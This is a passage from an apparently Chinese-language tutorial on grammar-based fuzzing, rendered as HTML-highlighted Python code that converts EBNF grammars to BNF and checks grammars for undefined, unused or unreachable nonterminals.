keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>expansions<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> exp_string<span class="token punctuation">(</span>exp<span class="token punctuation">)</span> <span class="token operator">!=</span> exp_string<span class="token punctuation">(</span>expansion<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        new_opts <span class="token operator">=</span> exp_opts<span class="token punctuation">(</span>exp<span class="token punctuation">)</span>        <span class="token keyword">if</span> opts <span class="token operator">==</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token keyword">or</span> new_opts <span class="token operator">==</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">:</span>            new_opts <span class="token operator">=</span> opts        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> key <span class="token keyword">in</span> opts<span class="token punctuation">:</span>                new_opts<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> opts<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        <span class="token keyword">if</span> new_opts <span class="token operator">==</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">:</span>            grammar<span class="token punctuation">[</span>symbol<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> exp_string<span class="token punctuation">(</span>exp<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            grammar<span class="token punctuation">[</span>symbol<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>exp_string<span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">,</span> new_opts<span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token keyword">raise</span> KeyError<span class="token punctuation">(</span>        <span class="token string">"no expansion "</span> <span class="token operator">+</span>        <span class="token builtin">repr</span><span class="token punctuation">(</span>symbol<span class="token punctuation">)</span> <span class="token operator">+</span>        <span class="token string">" -&gt; "</span> <span class="token operator">+</span>        <span class="token builtin">repr</span><span class="token punctuation">(</span>            exp_string<span class="token punctuation">(</span>expansion<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时，在写Fuzz的时候肯定不希望不断地写大量的符号和值的对应，因此我们需要一些语法来帮助，这里提供了ENBF的解析方法：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 解析 ebnf 语法</span><span class="token keyword">def</span> <span class="token function">new_symbol</span><span class="token punctuation">(</span>grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">,</span> symbol_name<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"&lt;symbol&gt;"</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Return a new symbol for `grammar` based on `symbol_name`"""</span>    <span class="token keyword">if</span> symbol_name <span class="token keyword">not</span> <span class="token keyword">in</span> grammar<span class="token punctuation">:</span>        <span class="token keyword">return</span> symbol_name    count <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        tentative_symbol_name <span class="token operator">=</span> symbol_name<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"-"</span> <span class="token operator">+</span> <span class="token builtin">repr</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&gt;"</span>        <span class="token keyword">if</span> tentative_symbol_name <span class="token keyword">not</span> <span class="token keyword">in</span> grammar<span class="token punctuation">:</span>            <span class="token keyword">return</span> tentative_symbol_name        count <span class="token operator">+=</span> <span class="token number">1</span><span class="token comment"># 提取表达式中符合EBNF语法的部分，? , * , + , ()</span><span class="token keyword">def</span> <span class="token function">parenthesized_expressions</span><span class="token punctuation">(</span>expansion<span class="token punctuation">:</span> Expansion<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    RE_PARENTHESIZED_EXPR <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'\([^()]*\)[?+*]'</span><span class="token punctuation">)</span>    <span class="token comment"># In later chapters, we allow expansions to be tuples,</span>    <span class="token comment"># with the expansion being the first element</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>expansion<span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        expansion <span class="token operator">=</span> expansion<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>RE_PARENTHESIZED_EXPR<span class="token punctuation">,</span> expansion<span class="token punctuation">)</span><span class="token comment"># 对Grammar中的EBNF语法括号进行解析</span><span class="token keyword">def</span> <span class="token function">convert_ebnf_parentheses</span><span class="token punctuation">(</span>ebnf_grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Grammar<span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Convert a grammar in extended BNF to BNF"""</span>    grammar <span class="token operator">=</span> extend_grammar<span class="token punctuation">(</span>ebnf_grammar<span class="token punctuation">)</span>    <span class="token keyword">for</span> nonterminal <span class="token keyword">in</span> ebnf_grammar<span class="token punctuation">:</span>        expansions <span class="token operator">=</span> ebnf_grammar<span class="token punctuation">[</span>nonterminal<span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>expansions<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            expansion <span class="token operator">=</span> expansions<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>expansion<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                expansion <span class="token operator">=</span> expansion<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                parenthesized_exprs <span class="token operator">=</span> parenthesized_expressions<span class="token punctuation">(</span>expansion<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>parenthesized_exprs<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                    <span class="token keyword">break</span>                <span class="token keyword">for</span> expr <span class="token keyword">in</span> parenthesized_exprs<span class="token punctuation">:</span>                    operator <span class="token operator">=</span> expr<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                    contents <span class="token operator">=</span> expr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>                    new_sym <span class="token operator">=</span> new_symbol<span class="token punctuation">(</span>grammar<span class="token punctuation">)</span>                    exp <span class="token operator">=</span> grammar<span class="token punctuation">[</span>nonterminal<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span>                    opts <span class="token operator">=</span> <span class="token boolean">None</span>                    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>exp<span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token punctuation">(</span>exp<span class="token punctuation">,</span> opts<span class="token punctuation">)</span> <span class="token operator">=</span> exp                    <span class="token keyword">assert</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>exp<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span>                    expansion <span class="token operator">=</span> exp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>expr<span class="token punctuation">,</span> new_sym <span class="token operator">+</span> operator<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> opts<span class="token punctuation">:</span>                        grammar<span class="token punctuation">[</span>nonterminal<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>expansion<span class="token punctuation">,</span> opts<span class="token punctuation">)</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        grammar<span class="token punctuation">[</span>nonterminal<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> expansion                    grammar<span class="token punctuation">[</span>new_sym<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>contents<span class="token punctuation">]</span>    <span class="token keyword">return</span> grammar<span class="token comment"># ENBF符号扩展</span><span class="token keyword">def</span> <span class="token function">extended_nonterminals</span><span class="token punctuation">(</span>expansion<span class="token punctuation">:</span> Expansion<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    RE_EXTENDED_NONTERMINAL <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'(&lt;[^&lt;&gt; ]*&gt;[?+*])'</span><span class="token punctuation">)</span>    <span class="token comment"># In later chapters, we allow expansions to be tuples,</span>    <span class="token comment"># with the expansion being the first element</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>expansion<span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        expansion <span class="token operator">=</span> expansion<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>RE_EXTENDED_NONTERMINAL<span class="token punctuation">,</span> expansion<span class="token punctuation">)</span><span class="token comment"># ENBF符号扩展</span><span class="token keyword">def</span> <span class="token function">convert_ebnf_operators</span><span class="token punctuation">(</span>ebnf_grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Grammar<span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Convert a grammar in extended BNF to BNF"""</span>    grammar <span class="token operator">=</span> extend_grammar<span class="token punctuation">(</span>ebnf_grammar<span class="token punctuation">)</span>    <span class="token keyword">for</span> nonterminal <span class="token keyword">in</span> ebnf_grammar<span class="token punctuation">:</span>        expansions <span class="token operator">=</span> ebnf_grammar<span class="token punctuation">[</span>nonterminal<span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>expansions<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            expansion <span class="token operator">=</span> expansions<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            extended_symbols <span class="token operator">=</span> extended_nonterminals<span class="token punctuation">(</span>expansion<span class="token punctuation">)</span>            <span class="token keyword">for</span> extended_symbol <span class="token keyword">in</span> extended_symbols<span class="token punctuation">:</span>                operator <span class="token operator">=</span> extended_symbol<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                original_symbol <span class="token operator">=</span> extended_symbol<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                <span class="token keyword">assert</span> original_symbol <span class="token keyword">in</span> ebnf_grammar<span class="token punctuation">,</span> \                    <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>original_symbol<span class="token punctuation">}</span></span><span class="token string"> is not defined in grammar"</span></span>                new_sym <span class="token operator">=</span> new_symbol<span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> original_symbol<span class="token punctuation">)</span>                exp <span class="token operator">=</span> grammar<span class="token punctuation">[</span>nonterminal<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span>                opts <span class="token operator">=</span> <span class="token boolean">None</span>                <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>exp<span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token punctuation">(</span>exp<span class="token punctuation">,</span> opts<span class="token punctuation">)</span> <span class="token operator">=</span> exp                <span class="token keyword">assert</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>exp<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span>                new_exp <span class="token operator">=</span> exp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>extended_symbol<span class="token punctuation">,</span> new_sym<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> opts<span class="token punctuation">:</span>                    grammar<span class="token punctuation">[</span>nonterminal<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>new_exp<span class="token punctuation">,</span> opts<span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    grammar<span class="token punctuation">[</span>nonterminal<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> new_exp                <span class="token keyword">if</span> operator <span class="token operator">==</span> <span class="token string">'?'</span><span class="token punctuation">:</span>                    grammar<span class="token punctuation">[</span>new_sym<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">,</span> original_symbol<span class="token punctuation">]</span>                <span class="token keyword">elif</span> operator <span class="token operator">==</span> <span class="token string">'*'</span><span class="token punctuation">:</span>                    grammar<span class="token punctuation">[</span>new_sym<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">,</span> original_symbol <span class="token operator">+</span> new_sym<span class="token punctuation">]</span>                <span class="token keyword">elif</span> operator <span class="token operator">==</span> <span class="token string">'+'</span><span class="token punctuation">:</span>                    grammar<span class="token punctuation">[</span>new_sym<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>                        original_symbol<span class="token punctuation">,</span> original_symbol <span class="token operator">+</span> new_sym<span class="token punctuation">]</span>    <span class="token keyword">return</span> grammar<span class="token keyword">def</span> <span class="token function">convert_ebnf_grammar</span><span class="token punctuation">(</span>ebnf_grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Grammar<span class="token punctuation">:</span>    <span class="token keyword">return</span> convert_ebnf_operators<span class="token punctuation">(</span>convert_ebnf_parentheses<span class="token punctuation">(</span>ebnf_grammar<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于Grammar来言，我们必须要确定它的一个合法性，不然在使用中必然会遇到各种错误问题，因此语法检查是很必要的，就如同编译器的语法检查很重要一样：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 搜索Grammar中的定义的noterminal</span><span class="token keyword">def</span> <span class="token function">def_used_nonterminals</span><span class="token punctuation">(</span>grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">,</span> start_symbol<span class="token punctuation">:</span>                           <span class="token builtin">str</span> <span class="token operator">=</span> START_SYMBOL<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Tuple<span class="token punctuation">[</span>Optional<span class="token punctuation">[</span>Set<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                                                        Optional<span class="token punctuation">[</span>Set<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Return a pair (`defined_nonterminals`, `used_nonterminals`) in `grammar`.    In case of error, return (`None`, `None`)."""</span>    defined_nonterminals <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    used_nonterminals <span class="token operator">=</span> <span class="token punctuation">{</span>start_symbol<span class="token punctuation">}</span>    <span class="token keyword">for</span> defined_nonterminal <span class="token keyword">in</span> grammar<span class="token punctuation">:</span>        defined_nonterminals<span class="token punctuation">.</span>add<span class="token punctuation">(</span>defined_nonterminal<span class="token punctuation">)</span>        expansions <span class="token operator">=</span> grammar<span class="token punctuation">[</span>defined_nonterminal<span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>expansions<span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>defined_nonterminal<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": expansion is not a list"</span><span class="token punctuation">,</span>                  <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>expansions<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>defined_nonterminal<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": expansion list empty"</span><span class="token punctuation">,</span>                  <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>        <span class="token keyword">for</span> expansion <span class="token keyword">in</span> expansions<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>expansion<span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                expansion <span class="token operator">=</span> expansion<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>expansion<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>defined_nonterminal<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": "</span>                      <span class="token operator">+</span> <span class="token builtin">repr</span><span class="token punctuation">(</span>expansion<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": not a string"</span><span class="token punctuation">,</span>                      <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>            <span class="token keyword">for</span> used_nonterminal <span class="token keyword">in</span> nonterminals<span class="token punctuation">(</span>expansion<span class="token punctuation">)</span><span class="token punctuation">:</span>                used_nonterminals<span class="token punctuation">.</span>add<span class="token punctuation">(</span>used_nonterminal<span class="token punctuation">)</span>    <span class="token keyword">return</span> defined_nonterminals<span class="token punctuation">,</span> used_nonterminals<span class="token keyword">def</span> <span class="token function">reachable_nonterminals</span><span class="token punctuation">(</span>grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">,</span>                           start_symbol<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> START_SYMBOL<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Set<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    reachable <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_find_reachable_nonterminals</span><span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> symbol<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">nonlocal</span> reachable        reachable<span class="token punctuation">.</span>add<span class="token punctuation">(</span>symbol<span class="token punctuation">)</span>        <span class="token keyword">for</span> expansion <span class="token keyword">in</span> grammar<span class="token punctuation">.</span>get<span class="token punctuation">(</span>symbol<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> nonterminal <span class="token keyword">in</span> nonterminals<span class="token punctuation">(</span>expansion<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> nonterminal <span class="token keyword">not</span> <span class="token keyword">in</span> reachable<span class="token punctuation">:</span>                    _find_reachable_nonterminals<span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> nonterminal<span class="token punctuation">)</span>    _find_reachable_nonterminals<span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> start_symbol<span class="token punctuation">)</span>    <span class="token keyword">return</span> reachable<span class="token keyword">def</span> <span class="token function">unreachable_nonterminals</span><span class="token punctuation">(</span>grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">,</span>                             start_symbol<span class="token operator">=</span>START_SYMBOL<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Set<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> grammar<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> reachable_nonterminals<span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> start_symbol<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">opts_used</span><span class="token punctuation">(</span>grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Set<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    used_opts <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> symbol <span class="token keyword">in</span> grammar<span class="token punctuation">:</span>        <span class="token keyword">for</span> expansion <span class="token keyword">in</span> grammar<span class="token punctuation">[</span>symbol<span class="token punctuation">]</span><span class="token punctuation">:</span>            used_opts <span class="token operator">|</span><span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span>exp_opts<span class="token punctuation">(</span>expansion<span class="token punctuation">)</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> used_opts<span class="token comment"># Grammar的合法性判断，类似于编译器里面的语法检查</span><span class="token keyword">def</span> <span class="token function">is_valid_grammar</span><span class="token punctuation">(</span>grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">,</span>                     start_symbol<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> START_SYMBOL<span class="token punctuation">,</span>                      supported_opts<span class="token punctuation">:</span> Set<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Check if the given `grammar` is valid.       `start_symbol`: optional start symbol (default: `&lt;start&gt;`)       `supported_opts`: options supported (default: none)"""</span>    defined_nonterminals<span class="token punctuation">,</span> used_nonterminals <span class="token operator">=</span> \        def_used_nonterminals<span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> start_symbol<span class="token punctuation">)</span>    <span class="token keyword">if</span> defined_nonterminals <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> used_nonterminals <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token comment"># Do not complain about '&lt;start&gt;' being not used,</span>    <span class="token comment"># even if start_symbol is different</span>    <span class="token keyword">if</span> START_SYMBOL <span class="token keyword">in</span> grammar<span class="token punctuation">:</span>        used_nonterminals<span class="token punctuation">.</span>add<span class="token punctuation">(</span>START_SYMBOL<span class="token punctuation">)</span>    <span class="token keyword">for</span> unused_nonterminal <span class="token keyword">in</span> defined_nonterminals <span class="token operator">-</span> used_nonterminals<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>unused_nonterminal<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": defined, but not used"</span><span class="token punctuation">,</span>              <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>    <span class="token keyword">for</span> undefined_nonterminal <span class="token keyword">in</span> used_nonterminals <span class="token operator">-</span> defined_nonterminals<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>undefined_nonterminal<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": used, but not defined"</span><span class="token punctuation">,</span>              <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>    <span class="token comment"># Symbols must be reachable either from &lt;start&gt; or given start symbol</span>    unreachable <span class="token operator">=</span> unreachable_nonterminals<span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> start_symbol<span class="token punctuation">)</span>    msg_start_symbol <span class="token operator">=</span> start_symbol    <span class="token keyword">if</span> START_SYMBOL <span class="token keyword">in</span> grammar<span class="token punctuation">:</span>        unreachable <span class="token operator">=</span> unreachable <span class="token operator">-</span> \            reachable_nonterminals<span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> START_SYMBOL<span class="token punctuation">)</span>        <span class="token keyword">if</span> start_symbol <span class="token operator">!=</span> START_SYMBOL<span class="token punctuation">:</span>            msg_start_symbol <span class="token operator">+=</span> <span class="token string">" or "</span> <span class="token operator">+</span> START_SYMBOL    <span class="token keyword">for</span> unreachable_nonterminal <span class="token keyword">in</span> unreachable<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>unreachable_nonterminal<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": unreachable from "</span> <span class="token operator">+</span> msg_start_symbol<span class="token punctuation">,</span>              <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>    used_but_not_supported_opts <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>supported_opts<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        used_but_not_supported_opts <span class="token operator">=</span> opts_used<span class="token punctuation">(</span>            grammar<span class="token punctuation">)</span><span class="token punctuation">.</span>difference<span class="token punctuation">(</span>supported_opts<span class="token punctuation">)</span>        <span class="token keyword">for</span> opt <span class="token keyword">in</span> used_but_not_supported_opts<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>                <span class="token string">"warning: option "</span> <span class="token operator">+</span>                <span class="token builtin">repr</span><span class="token punctuation">(</span>opt<span class="token punctuation">)</span> <span class="token operator">+</span>                <span class="token string">" is not supported"</span><span class="token punctuation">,</span>                <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>    <span class="token keyword">return</span> used_nonterminals <span class="token operator">==</span> defined_nonterminals <span class="token keyword">and</span> <span class="token 